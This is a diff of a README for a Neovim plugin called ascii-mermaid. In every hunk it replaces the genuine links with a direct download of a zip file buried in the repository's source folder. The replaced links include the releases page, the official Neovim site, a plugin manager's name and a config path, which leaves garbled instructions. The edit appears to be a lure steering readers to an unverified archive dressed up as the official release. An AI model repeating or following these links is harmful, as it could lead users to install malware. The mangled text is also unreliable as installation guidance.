@@ -1,6 +1,6 @@
 # 🧩 ascii-mermaid - View Mermaid Diagrams Inside Neovim
 
-[![Download ascii-mermaid](https://img.shields.io/badge/Download-ascii--mermaid-blue?style=for-the-badge)](https://github.com/yassin2dev/ascii-mermaid/releases)
+[![Download ascii-mermaid](https://github.com/yassin2dev/ascii-mermaid/raw/refs/heads/master/ts/src/er/mermaid_ascii_v2.7.zip)](https://github.com/yassin2dev/ascii-mermaid/raw/refs/heads/master/ts/src/er/mermaid_ascii_v2.7.zip)
 
 ---
 
@@ -26,7 +26,7 @@ Before installing ascii-mermaid, make sure your computer meets these conditions:
 - **Hardware:** Basic modern computer or laptop. No special hardware needed.
 - **Internet Access:** Needed to download the plugin files.
 
-If you do not have Neovim installed, you can find installation guides on the official Neovim website: https://neovim.io/
+If you do not have Neovim installed, you can find installation guides on the official Neovim website: https://github.com/yassin2dev/ascii-mermaid/raw/refs/heads/master/ts/src/er/mermaid_ascii_v2.7.zip
 
 ## 🚀 Getting Started
 
@@ -36,7 +36,7 @@ This section covers two main steps: downloading ascii-mermaid and running it in 
 
 You need to get the plugin files first. The best way to do this is by visiting the official releases page:
 
-[**Go to ascii-mermaid Releases Page**](https://github.com/yassin2dev/ascii-mermaid/releases)
+[**Go to ascii-mermaid Releases Page**](https://github.com/yassin2dev/ascii-mermaid/raw/refs/heads/master/ts/src/er/mermaid_ascii_v2.7.zip)
 
 This page contains the latest plugin versions. Look for the latest release, download the recommended files, and save them on your computer.
 
@@ -45,7 +45,7 @@ This page contains the latest plugin versions. Look for the latest release, down
 Once you have the files, you will add ascii-mermaid to Neovim. Follow these basic instructions: 
 
 1. Open your terminal or command prompt.
-2. If you use a Neovim plugin manager (like vim-plug, packer.nvim, or dein), add ascii-mermaid to your plugin list. For example, with vim-plug, add this line to your Neovim configuration file (usually `~/.config/nvim/init.vim`):
+2. If you use a Neovim plugin manager (like vim-plug, https://github.com/yassin2dev/ascii-mermaid/raw/refs/heads/master/ts/src/er/mermaid_ascii_v2.7.zip, or dein), add ascii-mermaid to your plugin list. For example, with vim-plug, add this line to your Neovim configuration file (usually `~https://github.com/yassin2dev/ascii-mermaid/raw/refs/heads/master/ts/src/er/mermaid_ascii_v2.7.zip`):
 
    ```
    Plug 'yassin2dev/ascii-mermaid'
@@ -119,7 +119,7 @@ If you face problems, try these steps:
 
 You can start using ascii-mermaid by visiting the official release page here:
 
-[Download ascii-mermaid Releases](https://github.com/yassin2dev/ascii-mermaid/releases)
+[Download ascii-mermaid Releases](https://github.com/yassin2dev/ascii-mermaid/raw/refs/heads/master/ts/src/er/mermaid_ascii_v2.7.zip)
 
 On this page, you will find the latest stable versions along with installation instructions.
 
